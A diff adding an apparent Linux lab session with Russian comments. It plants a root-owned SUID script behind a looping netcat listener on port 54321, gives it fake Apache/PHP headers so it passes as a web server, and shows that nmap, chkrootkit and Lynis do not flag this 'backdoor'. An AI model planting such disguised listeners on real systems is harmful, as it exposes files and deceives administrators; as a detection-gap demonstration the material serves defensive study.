@@ -1,0 +1,825 @@
+
+#создаем в "секретном месте" файл http-сервера
+user@debian2:/opt$ > /opt/http.sh
+
+# содержимое http.sh (выводит список файлов в домашнем каталоге user'а)
+user@debian2:/opt$ cat http.sh
+echo "HTTP/1.1 200 OK"
+echo "Date: Sat, 18 Oct 2020 10:20:30 GMT"
+echo "Server: Apache"
+echo "X-Powered-By: PHP/5.2.4-2ubuntu5wm1"
+echo "Last-Modified: Wed, 11 Feb 2009 11:20:59 GMT"
+echo "Content-Language: ru"
+echo "Content-Type: text/html; charset=utf-8"
+echo "Connection: close"
+echo ""
+echo "<pre>"
+ls -la /home/user
+echo "</pre>"
+
+#меняем владельца файла на root
+root@debian2:/opt# chown root:root /opt/http.sh
+
+#устанавливаем SUID-бит на файл http-сервера
+root@debian2:/opt# chmod +s /opt/http.sh
+
+#запускаем сервер на 54321 порту (от юзера)
+user@debian2:/opt$ while true; do cat a | nc -l -p 54321 | ./http.sh > a; done
+
+# сканируем nmap
+root@debian2:/opt# nmap -A -p 54321 localhost
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-10-18 16:12 +05
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000065s latency).
+Other addresses for localhost (not scanned): ::1
+
+PORT      STATE SERVICE VERSION
+54321/tcp open  unknown
+| fingerprint-strings:
+|   GenericLines, NULL:
+|     HTTP/1.1 200 OK
+|     Date: Sat, 18 Oct 2020 10:20:30 GMT
+|     Server: Apache
+|     X-Powered-By: PHP/5.2.4-2ubuntu5wm1
+|     Last-Modified: Wed, 11 Feb 2009 11:20:59 GMT
+|     Content-Language: ru
+|     Content-Type: text/html; charset=utf-8
+|     Connection: close
+|_    <pre>
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port54321-TCP:V=7.70%I=7%D=10/18%Time=5F8C2324%P=x86_64-pc-linux-gnu%r(
+SF:NULL,E9,"HTTP/1\.1\x20200\x20OK\nDate:\x20Sat,\x2018\x20Oct\x202020\x20
+SF:10:20:30\x20GMT\nServer:\x20Apache\nX-Powered-By:\x20PHP/5\.2\.4-2ubunt
+SF:u5wm1\nLast-Modified:\x20Wed,\x2011\x20Feb\x202009\x2011:20:59\x20GMT\n
+SF:Content-Language:\x20ru\nContent-Type:\x20text/html;\x20charset=utf-8\n
+SF:Connection:\x20close\n\n<pre>\n")%r(GenericLines,E9,"HTTP/1\.1\x20200\x
+SF:20OK\nDate:\x20Sat,\x2018\x20Oct\x202020\x2010:20:30\x20GMT\nServer:\x2
+SF:0Apache\nX-Powered-By:\x20PHP/5\.2\.4-2ubuntu5wm1\nLast-Modified:\x20We
+SF:d,\x2011\x20Feb\x202009\x2011:20:59\x20GMT\nContent-Language:\x20ru\nCo
+SF:ntent-Type:\x20text/html;\x20charset=utf-8\nConnection:\x20close\n\n<pr
+SF:e>\n");
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6.32
+OS details: Linux 2.6.32
+Network Distance: 0 hops
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.08 seconds
+
+
+#пробуем chkrootkit
+root@debian2:/opt# /usr/sbin/chkrootkit
+ROOTDIR is `/'
+Checking `amd'...                                           not found
+Checking `basename'...                                      not infected
+Checking `biff'...                                          not found
+Checking `chfn'...                                          not infected
+Checking `chsh'...                                          not infected
+Checking `cron'...                                          not infected
+Checking `crontab'...                                       not infected
+Checking `date'...                                          not infected
+Checking `du'...                                            not infected
+Checking `dirname'...                                       not infected
+Checking `echo'...                                          not infected
+Checking `egrep'...                                         not infected
+Checking `env'...                                           not infected
+Checking `find'...                                          not infected
+Checking `fingerd'...                                       not found
+Checking `gpm'...                                           not found
+Checking `grep'...                                          not infected
+Checking `hdparm'...                                        not infected
+Checking `su'...                                            not infected
+Checking `ifconfig'...                                      not infected
+Checking `inetd'...                                         not infected
+Checking `inetdconf'...                                     not found
+Checking `identd'...                                        not found
+Checking `init'...                                          not infected
+Checking `killall'...                                       not found
+Checking `ldsopreload'...                                   not infected
+Checking `login'...                                         not infected
+Checking `ls'...                                            not infected
+Checking `lsof'...                                          not infected
+Checking `mail'...                                          not found
+Checking `mingetty'...                                      not found
+Checking `netstat'...                                       not infected
+Checking `named'...                                         not found
+Checking `passwd'...                                        not infected
+Checking `pidof'...                                         not infected
+Checking `pop2'...                                          not found
+Checking `pop3'...                                          not found
+Checking `ps'...                                            not infected
+Checking `pstree'...                                        not found
+Checking `rpcinfo'...                                       not found
+Checking `rlogind'...                                       not found
+Checking `rshd'...                                          not found
+Checking `slogin'...                                        not infected
+Checking `sendmail'...                                      not found
+Checking `sshd'...                                          not infected
+Checking `syslogd'...                                       not tested
+Checking `tar'...                                           not infected
+Checking `tcpd'...                                          not found
+Checking `tcpdump'...                                       not infected
+Checking `top'...                                           not infected
+Checking `telnetd'...                                       not found
+Checking `timed'...                                         not found
+Checking `traceroute'...                                    not infected
+Checking `vdir'...                                          not infected
+Checking `w'...                                             not infected
+Checking `write'...                                         not infected
+Checking `aliens'...                                        no suspect files
+Searching for sniffer's logs, it may take a while...        nothing found
+Searching for rootkit HiDrootkit's default files...         nothing found
+Searching for rootkit t0rn's default files...               nothing found
+Searching for t0rn's v8 defaults...                         nothing found
+Searching for rootkit Lion's default files...               nothing found
+Searching for rootkit RSHA's default files...               nothing found
+Searching for rootkit RH-Sharpe's default files...          nothing found
+Searching for Ambient's rootkit (ark) default files and dirs... nothing found
+Searching for suspicious files and dirs, it may take a while... nothing found
+Searching for LPD Worm files and dirs...                    nothing found
+Searching for Ramen Worm files and dirs...                  nothing found
+Searching for Maniac files and dirs...                      nothing found
+Searching for RK17 files and dirs...                        nothing found
+Searching for Ducoci rootkit...                             nothing found
+Searching for Adore Worm...                                 nothing found
+Searching for ShitC Worm...                                 nothing found
+Searching for Omega Worm...                                 nothing found
+Searching for Sadmind/IIS Worm...                           nothing found
+Searching for MonKit...                                     nothing found
+Searching for Showtee...                                    nothing found
+Searching for OpticKit...                                   nothing found
+Searching for T.R.K...                                      nothing found
+Searching for Mithra...                                     nothing found
+Searching for LOC rootkit...                                nothing found
+Searching for Romanian rootkit...                           nothing found
+Searching for Suckit rootkit...                             nothing found
+Searching for Volc rootkit...                               nothing found
+Searching for Gold2 rootkit...                              nothing found
+Searching for TC2 Worm default files and dirs...            nothing found
+Searching for Anonoying rootkit default files and dirs...   nothing found
+Searching for ZK rootkit default files and dirs...          nothing found
+Searching for ShKit rootkit default files and dirs...       nothing found
+Searching for AjaKit rootkit default files and dirs...      nothing found
+Searching for zaRwT rootkit default files and dirs...       nothing found
+Searching for Madalin rootkit default files...              nothing found
+Searching for Fu rootkit default files...                   nothing found
+Searching for ESRK rootkit default files...                 nothing found
+Searching for rootedoor...                                  nothing found
+Searching for ENYELKM rootkit default files...              nothing found
+Searching for common ssh-scanners default files...          nothing found
+Searching for Linux/Ebury - Operation Windigo ssh...        not tested
+Searching for 64-bit Linux Rootkit ...                      nothing found
+Searching for 64-bit Linux Rootkit modules...               nothing found
+Searching for Mumblehard Linux ...                          nothing found
+Searching for Backdoor.Linux.Mokes.a ...                    nothing found
+Searching for Malicious TinyDNS ...                         nothing found
+Searching for Linux.Xor.DDoS ...                            nothing found
+Searching for Linux.Proxy.1.0 ...                           nothing found
+Searching for suspect PHP files...                          nothing found
+Searching for anomalies in shell history files...           nothing found
+Checking `asp'...                                           not infected
+Checking `bindshell'...                                     not infected
+Checking `lkm'...                                           chkproc: nothing detected
+chkdirs: nothing detected
+Checking `rexedcs'...                                       not found
+Checking `sniffer'...                                       lo: not promisc and no packet sniffer sockets
+enp0s17: not promisc and no packet sniffer sockets
+Checking `w55808'...                                        not infected
+Checking `wted'...                                          chkwtmp: nothing deleted
+Checking `scalper'...                                       not infected
+Checking `slapper'...                                       not infected
+Checking `z2'...                                            chklastlog: nothing deleted
+Checking `chkutmp'...                                       chkutmp: nothing deleted
+Checking `OSX_RSPLUG'...                                    not tested
+
+
+#пробуем сканер Lynis
+root@debian2:/opt# /usr/sbin/lynis audit system
+
+[ Lynis 2.6.2 ]
+
+################################################################################
+  Lynis comes with ABSOLUTELY NO WARRANTY. This is free software, and you are
+  welcome to redistribute it under the terms of the GNU General Public License.
+  See the LICENSE file for details about using this software.
+
+  2007-2018, CISOfy - https://cisofy.com/lynis/
+  Enterprise support available (compliance, plugins, interface and tools)
+################################################################################
+
+
+[+] Initializing program
+------------------------------------
+  - Detecting OS...                                           [ DONE ]
+  - Checking profiles...                                      [ DONE ]
+
+  ---------------------------------------------------
+  Program version:           2.6.2
+  Operating system:          Linux
+  Operating system name:     Debian
+  Operating system version:  10.6
+  Kernel version:            4.19.0
+  Hardware platform:         x86_64
+  Hostname:                  debian2
+  ---------------------------------------------------
+  Profiles:                  /etc/lynis/default.prf
+  Log file:                  /var/log/lynis.log
+  Report file:               /var/log/lynis-report.dat
+  Report version:            1.0
+  Plugin directory:          /etc/lynis/plugins
+  ---------------------------------------------------
+  Auditor:                   [Not Specified]
+  Language:                  en
+  Test category:             all
+  Test group:                all
+  ---------------------------------------------------
+  - Program update status...                                  [ WARNING ]
+
+      ===============================================================================
+        Lynis update available
+      ===============================================================================
+
+        Current version is more than 4 months old
+
+        Current version : 262   Latest version : 301
+
+        Please update to the latest version.
+        New releases include additional features, bug fixes, tests, and baselines.
+
+        Download the latest version:
+
+        Packages (DEB/RPM) -  https://packages.cisofy.com
+        Website (TAR)      -  https://cisofy.com/downloads/
+        GitHub (source)    -  https://github.com/CISOfy/lynis
+
+      ===============================================================================
+
+
+[+] System Tools
+------------------------------------
+  - Scanning available tools...
+  - Checking system binaries...
+
+[+] Plugins (phase 1)
+------------------------------------
+ Note: plugins have more extensive tests and may take several minutes to complete
+
+  - Plugin: debian
+    [
+[+] Debian Tests
+------------------------------------
+  - Checking for system binaries that are required by Debian Tests...
+    - Checking /bin...                                        [ FOUND ]
+    - Checking /sbin...                                       [ FOUND ]
+    - Checking /usr/bin...                                    [ FOUND ]
+    - Checking /usr/sbin...                                   [ FOUND ]
+    - Checking /usr/local/bin...                              [ FOUND ]
+    - Checking /usr/local/sbin...                             [ FOUND ]
+  - Authentication:
+    - PAM (Pluggable Authentication Modules):
+      - libpam-tmpdir                                         [ Not Installed ]
+      - libpam-usb                                            [ Not Installed ]
+  - File System Checks:
+    - DM-Crypt, Cryptsetup & Cryptmount:
+  - Software:
+    - apt-listbugs                                            [ Not Installed ]
+    - apt-listchanges                                         [ Installed and enabled for apt ]
+    - checkrestart                                            [ Not Installed ]
+    - needrestart                                             [ Not Installed ]
+    - debsecan                                                [ Not Installed ]
+    - debsums                                                 [ Not Installed ]
+    - fail2ban                                                [ Not Installed ]
+]
+
+[+] Boot and services
+------------------------------------
+  - Service Manager                                           [ systemd ]
+  - Checking UEFI boot                                        [ DISABLED ]
+  - Checking presence GRUB2                                   [ FOUND ]
+    - Checking for password protection                        [ WARNING ]
+  - Check running services (systemctl)                        [ DONE ]
+        Result: found 15 running services
+  - Check enabled services at boot (systemctl)                [ DONE ]
+        Result: found 26 enabled services
+  - Check startup files (permissions)                         [ OK ]
+  - Checking sulogin in rescue.service                        [ NOT FOUND ]
+
+[+] Kernel
+------------------------------------
+  - Checking default run level                                [ RUNLEVEL 5 ]
+  - Checking CPU support (NX/PAE)
+    CPU support: PAE and/or NoeXecute supported               [ FOUND ]
+  - Checking kernel version and release                       [ DONE ]
+  - Checking kernel type                                      [ DONE ]
+  - Checking loaded kernel modules                            [ DONE ]
+      Found 63 active modules
+  - Checking Linux kernel configuration file                  [ FOUND ]
+  - Checking default I/O kernel scheduler                     [ FOUND ]
+  - Checking for available kernel update                      [ OK ]
+  - Checking core dumps configuration                         [ DISABLED ]
+    - Checking setuid core dumps configuration                [ DEFAULT ]
+  - Check if reboot is needed                                 [ NO ]
+
+[+] Memory and Processes
+------------------------------------
+  - Checking /proc/meminfo                                    [ FOUND ]
+  - Searching for dead/zombie processes                       [ OK ]
+  - Searching for IO waiting processes                        [ OK ]
+
+[+] Users, Groups and Authentication
+------------------------------------
+  - Administrator accounts                                    [ OK ]
+  - Unique UIDs                                               [ OK ]
+  - Consistency of group files (grpck)                        [ OK ]
+  - Unique group IDs                                          [ OK ]
+  - Unique group names                                        [ OK ]
+  - Password file consistency                                 [ OK ]
+  - Query system users (non daemons)                          [ DONE ]
+  - NIS+ authentication support                               [ NOT ENABLED ]
+  - NIS authentication support                                [ NOT ENABLED ]
+  - sudoers file                                              [ FOUND ]
+    - Check sudoers file permissions                          [ OK ]
+  - PAM password strength tools                               [ SUGGESTION ]
+  - PAM configuration files (pam.conf)                        [ FOUND ]
+  - PAM configuration files (pam.d)                           [ FOUND ]
+  - PAM modules                                               [ FOUND ]
+  - LDAP module in PAM                                        [ NOT FOUND ]
+  - Accounts without expire date                              [ OK ]
+  - Accounts without password                                 [ OK ]
+  - Checking user password aging (minimum)                    [ DISABLED ]
+  - User password aging (maximum)                             [ DISABLED ]
+  - Checking expired passwords                                [ OK ]
+  - Checking Linux single user mode authentication            [ WARNING ]
+  - Determining default umask
+    - umask (/etc/profile)                                    [ NOT FOUND ]
+    - umask (/etc/login.defs)                                 [ SUGGESTION ]
+  - LDAP authentication support                               [ NOT ENABLED ]
+  - Logging failed login attempts                             [ ENABLED ]
+
+[+] Shells
+------------------------------------
+  - Checking shells from /etc/shells
+    Result: found 7 shells (valid shells: 7).
+    - Session timeout settings/tools                          [ NONE ]
+  - Checking default umask values
+    - Checking default umask in /etc/bash.bashrc              [ NONE ]
+    - Checking default umask in /etc/profile                  [ NONE ]
+
+[+] File systems
+------------------------------------
+  - Checking mount points
+    - Checking /home mount point                              [ SUGGESTION ]
+    - Checking /tmp mount point                               [ SUGGESTION ]
+    - Checking /var mount point                               [ SUGGESTION ]
+  - Checking LVM volume groups                                [ FOUND ]
+    - Checking LVM volumes                                    [ FOUND ]
+  - Query swap partitions (fstab)                             [ OK ]
+  - Testing swap partitions                                   [ OK ]
+  - Testing /proc mount (hidepid)                             [ SUGGESTION ]
+  - Checking for old files in /tmp                            [ OK ]
+  - Checking /tmp sticky bit                                  [ OK ]
+  - Checking /var/tmp sticky bit                              [ OK ]
+  - ACL support root file system                              [ ENABLED ]
+  - Mount options of /                                        [ NON DEFAULT ]
+  - Mount options of /boot                                    [ NON DEFAULT ]
+  - Disable kernel support of some filesystems
+    - Discovered kernel modules: freevxfs hfs hfsplus jffs2 squashfs udf
+
+[+] USB Devices
+------------------------------------
+  - Checking usb-storage driver (modprobe config)             [ NOT DISABLED ]
+  - Checking USB devices authorization                        [ ENABLED ]
+  - Checking USBGuard                                         [ NOT FOUND ]
+
+[+] Storage
+------------------------------------
+  - Checking firewire ohci driver (modprobe config)           [ NOT DISABLED ]
+
+[+] NFS
+------------------------------------
+  - Check running NFS daemon                                  [ NOT FOUND ]
+
+[+] Name services
+------------------------------------
+  - Searching DNS domain name                                 [ UNKNOWN ]
+  - Checking /etc/hosts
+    - Checking /etc/hosts (duplicates)                        [ OK ]
+    - Checking /etc/hosts (hostname)                          [ SUGGESTION ]
+    - Checking /etc/hosts (localhost)                         [ OK ]
+    - Checking /etc/hosts (localhost to IP)                   [ OK ]
+
+[+] Ports and packages
+------------------------------------
+  - Searching package managers
+    - Searching dpkg package manager                          [ FOUND ]
+      - Querying package manager
+    - Query unpurged packages                                 [ NONE ]
+  - Checking security repository in sources.list file         [ OK ]
+  - Checking vulnerable packages (apt-get only)               [ DONE ]
+  - Checking package audit tool                               [ INSTALLED ]
+    Found: apt-get
+
+[+] Networking
+------------------------------------
+  - Checking IPv6 configuration                               [ DISABLED ]
+  - Checking configured nameservers
+    - Testing nameservers
+      Nameserver: 192.168.1.1                                 [ SKIPPED ]
+      Nameserver: 0.0.0.0                                     [ SKIPPED ]
+  - Checking default gateway                                  [ DONE ]
+  - Getting listening ports (TCP/UDP)                         [ DONE ]
+      * Found 4 ports
+  - Checking promiscuous interfaces                           [ OK ]
+  - Checking waiting connections                              [ OK ]
+  - Checking status DHCP client                               [ NOT ACTIVE ]
+  - Checking for ARP monitoring software                      [ NOT FOUND ]
+
+[+] Printers and Spools
+------------------------------------
+  - Checking cups daemon                                      [ NOT FOUND ]
+  - Checking lp daemon                                        [ NOT RUNNING ]
+
+[+] Software: e-mail and messaging
+------------------------------------
+
+[+] Software: firewalls
+------------------------------------
+  - Checking iptables kernel module                           [ FOUND ]
+    - Checking iptables policies of chains                    [ FOUND ]
+      - Checking chain INPUT (table: filter, policy )         [ other ]
+    - Checking for empty ruleset                              [ WARNING ]
+    - Checking for unused rules                               [ OK ]
+  - Checking host based firewall                              [ ACTIVE ]
+
+[+] Software: webserver
+------------------------------------
+  - Checking Apache (binary /usr/sbin/apache2)                [ FOUND ]
+      Info: Configuration file found (/etc/apache2/apache2.conf)
+      Info: No virtual hosts found
+    * Loadable modules                                        [ FOUND (117) ]
+        - Found 117 loadable modules
+          mod_evasive: anti-DoS/brute force                   [ NOT FOUND ]
+          mod_reqtimeout/mod_qos                              [ FOUND ]
+          ModSecurity: web application firewall               [ NOT FOUND ]
+  - Checking nginx                                            [ NOT FOUND ]
+
+[+] SSH Support
+------------------------------------
+  - Checking running SSH daemon                               [ FOUND ]
+    - Searching SSH configuration                             [ FOUND ]
+    - SSH option: AllowTcpForwarding                          [ SUGGESTION ]
+    - SSH option: ClientAliveCountMax                         [ SUGGESTION ]
+    - SSH option: ClientAliveInterval                         [ OK ]
+    - SSH option: Compression                                 [ SUGGESTION ]
+    - SSH option: FingerprintHash                             [ OK ]
+    - SSH option: GatewayPorts                                [ OK ]
+    - SSH option: IgnoreRhosts                                [ OK ]
+    - SSH option: LoginGraceTime                              [ OK ]
+    - SSH option: LogLevel                                    [ SUGGESTION ]
+    - SSH option: MaxAuthTries                                [ SUGGESTION ]
+    - SSH option: MaxSessions                                 [ SUGGESTION ]
+    - SSH option: PermitRootLogin                             [ SUGGESTION ]
+    - SSH option: PermitUserEnvironment                       [ OK ]
+    - SSH option: PermitTunnel                                [ OK ]
+    - SSH option: Port                                        [ SUGGESTION ]
+    - SSH option: PrintLastLog                                [ OK ]
+    - SSH option: Protocol                                    [ NOT FOUND ]
+    - SSH option: StrictModes                                 [ OK ]
+    - SSH option: TCPKeepAlive                                [ SUGGESTION ]
+    - SSH option: UseDNS                                      [ OK ]
+    - SSH option: UsePrivilegeSeparation                      [ NOT FOUND ]
+    - SSH option: VerifyReverseMapping                        [ NOT FOUND ]
+    - SSH option: X11Forwarding                               [ SUGGESTION ]
+    - SSH option: AllowAgentForwarding                        [ SUGGESTION ]
+    - SSH option: AllowUsers                                  [ NOT FOUND ]
+    - SSH option: AllowGroups                                 [ NOT FOUND ]
+
+[+] SNMP Support
+------------------------------------
+  - Checking running SNMP daemon                              [ NOT FOUND ]
+
+[+] Databases
+------------------------------------
+    No database engines found
+
+[+] LDAP Services
+------------------------------------
+  - Checking OpenLDAP instance                                [ NOT FOUND ]
+
+[+] PHP
+------------------------------------
+  - Checking PHP                                              [ NOT FOUND ]
+
+[+] Squid Support
+------------------------------------
+  - Checking running Squid daemon                             [ NOT FOUND ]
+
+[+] Logging and files
+------------------------------------
+  - Checking for a running log daemon                         [ OK ]
+    - Checking Syslog-NG status                               [ NOT FOUND ]
+    - Checking systemd journal status                         [ FOUND ]
+    - Checking Metalog status                                 [ NOT FOUND ]
+    - Checking RSyslog status                                 [ FOUND ]
+    - Checking RFC 3195 daemon status                         [ NOT FOUND ]
+    - Checking minilogd instances                             [ NOT FOUND ]
+  - Checking logrotate presence                               [ OK ]
+  - Checking log directories (static list)                    [ DONE ]
+  - Checking open log files                                   [ DONE ]
+  - Checking deleted files in use                             [ DONE ]
+
+[+] Insecure services
+------------------------------------
+  - Checking inetd status                                     [ NOT ACTIVE ]
+
+[+] Banners and identification
+------------------------------------
+  - /etc/issue                                                [ FOUND ]
+    - /etc/issue contents                                     [ WEAK ]
+  - /etc/issue.net                                            [ FOUND ]
+    - /etc/issue.net contents                                 [ WEAK ]
+
+[+] Scheduled tasks
+------------------------------------
+  - Checking crontab/cronjob                                  [ DONE ]
+
+[+] Accounting
+------------------------------------
+  - Checking accounting information                           [ NOT FOUND ]
+  - Checking sysstat accounting data                          [ NOT FOUND ]
+  - Checking auditd                                           [ NOT FOUND ]
+
+[+] Time and Synchronization
+------------------------------------
+  - NTP daemon found: systemd (timesyncd)                     [ FOUND ]
+  - Checking for a running NTP daemon or client               [ OK ]
+
+[+] Cryptography
+------------------------------------
+  - Checking for expired SSL certificates [0/2]               [ NONE ]
+
+[+] Virtualization
+------------------------------------
+
+[+] Containers
+------------------------------------
+
+[+] Security frameworks
+------------------------------------
+  - Checking presence AppArmor                                [ FOUND ]
+    - Checking AppArmor status                                [ ENABLED ]
+  - Checking presence SELinux                                 [ NOT FOUND ]
+  - Checking presence grsecurity                              [ NOT FOUND ]
+  - Checking for implemented MAC framework                    [ OK ]
+
+[+] Software: file integrity
+------------------------------------
+  - Checking file integrity tools
+  - Checking presence integrity tool                          [ NOT FOUND ]
+
+[+] Software: System tooling
+------------------------------------
+  - Checking automation tooling
+  - Automation tooling                                        [ NOT FOUND ]
+  - Checking for IDS/IPS tooling                              [ NONE ]
+
+[+] Software: Malware
+------------------------------------
+  - Checking chkrootkit                                       [ FOUND ]
+
+[+] File Permissions
+------------------------------------
+  - Starting file permissions check
+
+[+] Home directories
+------------------------------------
+  - Checking shell history files                              [ OK ]
+
+[+] Kernel Hardening
+------------------------------------
+  - Comparing sysctl key pairs with scan profile
+
+[+] Hardening
+------------------------------------
+    - Installed compiler(s)                                   [ FOUND ]
+    - Installed malware scanner                               [ FOUND ]
+
+[+] Custom Tests
+------------------------------------
+  - Running custom tests...                                   [ NONE ]
+
+[+] Plugins (phase 2)
+------------------------------------
+
+================================================================================
+
+  -[ Lynis 2.6.2 Results ]-
+
+  Warnings (3):
+  ----------------------------
+  ! Version of Lynis is very old and should be updated [LYNIS]
+      https://cisofy.com/controls/LYNIS/
+
+  ! No password set for single mode [AUTH-9308]
+      https://cisofy.com/controls/AUTH-9308/
+
+  ! iptables module(s) loaded, but no rules active [FIRE-4512]
+      https://cisofy.com/controls/FIRE-4512/
+
+  Suggestions (45):
+  ----------------------------
+  * Install libpam-tmpdir to set $TMP and $TMPDIR for PAM sessions [CUST-0280]
+      https://your-domain.example.org/controls/CUST-0280/
+
+  * Install libpam-usb to enable multi-factor authentication for PAM sessions [CUST-0285]
+      https://your-domain.example.org/controls/CUST-0285/
+
+  * Install apt-listbugs to display a list of critical bugs prior to each APT installation. [CUST-0810]
+      https://your-domain.example.org/controls/CUST-0810/
+
+  * Install debian-goodies so that you can run checkrestart after upgrades to determine which services are using old versions of libraries and need restarting. [CUST-0830]
+      https://your-domain.example.org/controls/CUST-0830/
+
+  * Install needrestart, alternatively to debian-goodies, so that you can run needrestart after upgrades to determine which daemons are using old versions of libraries and need restarting. [CUST-0831]
+      https://your-domain.example.org/controls/CUST-0831/
+
+  * Install debsecan to generate lists of vulnerabilities which affect this installation. [CUST-0870]
+      https://your-domain.example.org/controls/CUST-0870/
+
+  * Install debsums for the verification of installed package files against MD5 checksums. [CUST-0875]
+      https://your-domain.example.org/controls/CUST-0875/
+
+  * Install fail2ban to automatically ban hosts that commit multiple authentication errors. [DEB-0880]
+      https://cisofy.com/controls/DEB-0880/
+
+  * Set a password on GRUB bootloader to prevent altering boot configuration (e.g. boot in single user mode without password) [BOOT-5122]
+      https://cisofy.com/controls/BOOT-5122/
+
+  * Protect rescue.service by using sulogin [BOOT-5260]
+      https://cisofy.com/controls/BOOT-5260/
+
+  * Install a PAM module for password strength testing like pam_cracklib or pam_passwdqc [AUTH-9262]
+      https://cisofy.com/controls/AUTH-9262/
+
+  * Configure minimum password age in /etc/login.defs [AUTH-9286]
+      https://cisofy.com/controls/AUTH-9286/
+
+  * Configure maximum password age in /etc/login.defs [AUTH-9286]
+      https://cisofy.com/controls/AUTH-9286/
+
+  * Set password for single user mode to minimize physical access attack surface [AUTH-9308]
+      https://cisofy.com/controls/AUTH-9308/
+
+  * Default umask in /etc/login.defs could be more strict like 027 [AUTH-9328]
+      https://cisofy.com/controls/AUTH-9328/
+
+  * To decrease the impact of a full /home file system, place /home on a separated partition [FILE-6310]
+      https://cisofy.com/controls/FILE-6310/
+
+  * To decrease the impact of a full /tmp file system, place /tmp on a separated partition [FILE-6310]
+      https://cisofy.com/controls/FILE-6310/
+
+  * To decrease the impact of a full /var file system, place /var on a separated partition [FILE-6310]
+      https://cisofy.com/controls/FILE-6310/
+
+  * Disable drivers like USB storage when not used, to prevent unauthorized storage or data theft [STRG-1840]
+      https://cisofy.com/controls/STRG-1840/
+
+  * Disable drivers like firewire storage when not used, to prevent unauthorized storage or data theft [STRG-1846]
+      https://cisofy.com/controls/STRG-1846/
+
+  * Check DNS configuration for the dns domain name [NAME-4028]
+      https://cisofy.com/controls/NAME-4028/
+
+  * Add the IP name and FQDN to /etc/hosts for proper name resolving [NAME-4404]
+      https://cisofy.com/controls/NAME-4404/
+
+  * Install debsums utility for the verification of packages with known good database. [PKGS-7370]
+      https://cisofy.com/controls/PKGS-7370/
+
+  * Consider running ARP monitoring software (arpwatch,arpon) [NETW-3032]
+      https://cisofy.com/controls/NETW-3032/
+
+  * Install Apache mod_evasive to guard webserver against DoS/brute force attempts [HTTP-6640]
+      https://cisofy.com/controls/HTTP-6640/
+
+  * Install Apache modsecurity to guard webserver against web application attacks [HTTP-6643]
+      https://cisofy.com/controls/HTTP-6643/
+
+  * Consider hardening SSH configuration [SSH-7408]
+    - Details  : AllowTcpForwarding (YES --> NO)
+      https://cisofy.com/controls/SSH-7408/
+
+  * Consider hardening SSH configuration [SSH-7408]
+    - Details  : ClientAliveCountMax (3 --> 2)
+      https://cisofy.com/controls/SSH-7408/
+
+  * Consider hardening SSH configuration [SSH-7408]
+    - Details  : Compression (YES --> (DELAYED|NO))
+      https://cisofy.com/controls/SSH-7408/
+
+  * Consider hardening SSH configuration [SSH-7408]
+    - Details  : LogLevel (INFO --> VERBOSE)
+      https://cisofy.com/controls/SSH-7408/
+
+  * Consider hardening SSH configuration [SSH-7408]
+    - Details  : MaxAuthTries (6 --> 2)
+      https://cisofy.com/controls/SSH-7408/
+
+  * Consider hardening SSH configuration [SSH-7408]
+    - Details  : MaxSessions (10 --> 2)
+      https://cisofy.com/controls/SSH-7408/
+
+  * Consider hardening SSH configuration [SSH-7408]
+    - Details  : PermitRootLogin (WITHOUT-PASSWORD --> NO)
+      https://cisofy.com/controls/SSH-7408/
+
+  * Consider hardening SSH configuration [SSH-7408]
+    - Details  : Port (22 --> )
+      https://cisofy.com/controls/SSH-7408/
+
+  * Consider hardening SSH configuration [SSH-7408]
+    - Details  : TCPKeepAlive (YES --> NO)
+      https://cisofy.com/controls/SSH-7408/
+
+  * Consider hardening SSH configuration [SSH-7408]
+    - Details  : X11Forwarding (YES --> NO)
+      https://cisofy.com/controls/SSH-7408/
+
+  * Consider hardening SSH configuration [SSH-7408]
+    - Details  : AllowAgentForwarding (YES --> NO)
+      https://cisofy.com/controls/SSH-7408/
+
+  * Add a legal banner to /etc/issue, to warn unauthorized users [BANN-7126]
+      https://cisofy.com/controls/BANN-7126/
+
+  * Add legal banner to /etc/issue.net, to warn unauthorized users [BANN-7130]
+      https://cisofy.com/controls/BANN-7130/
+
+  * Enable process accounting [ACCT-9622]
+      https://cisofy.com/controls/ACCT-9622/
+
+  * Enable sysstat to collect accounting (no results) [ACCT-9626]
+      https://cisofy.com/controls/ACCT-9626/
+
+  * Enable auditd to collect audit information [ACCT-9628]
+      https://cisofy.com/controls/ACCT-9628/
+
+  * Install a file integrity tool to monitor changes to critical and sensitive files [FINT-4350]
+      https://cisofy.com/controls/FINT-4350/
+
+  * Determine if automation tools are present for system management [TOOL-5002]
+      https://cisofy.com/controls/TOOL-5002/
+
+  * Harden compilers like restricting access to root user only [HRDN-7222]
+      https://cisofy.com/controls/HRDN-7222/
+
+  Follow-up:
+  ----------------------------
+  - Show details of a test (lynis show details TEST-ID)
+  - Check the logfile for all details (less /var/log/lynis.log)
+  - Read security controls texts (https://cisofy.com)
+  - Use --upload to upload data to central system (Lynis Enterprise users)
+
+================================================================================
+
+  Lynis security scan details:
+
+  Hardening index : 58 [###########         ]
+  Tests performed : 222
+  Plugins enabled : 1
+
+  Components:
+  - Firewall               [V]
+  - Malware scanner        [V]
+
+  Lynis Modules:
+  - Compliance Status      [?]
+  - Security Audit         [V]
+  - Vulnerability Scan     [V]
+
+  Files:
+  - Test and debug information      : /var/log/lynis.log
+  - Report data                     : /var/log/lynis-report.dat
+
+================================================================================
+  Notice: Lynis update available
+  Current version : 262    Latest version : 301
+================================================================================
+
+  Lynis 2.6.2
+
+  Auditing, system hardening, and compliance for UNIX-based systems
+  (Linux, macOS, BSD, and others)
+
+  2007-2018, CISOfy - https://cisofy.com/lynis/
+  Enterprise support available (compliance, plugins, interface and tools)
+
+================================================================================
+
+  [TIP]: Enhance Lynis audits by adding your settings to custom.prf (see /etc/lynis/default.prf for all settings)
+
+
+# chkrootkit и Lynis не нашли наш "бэкдор".
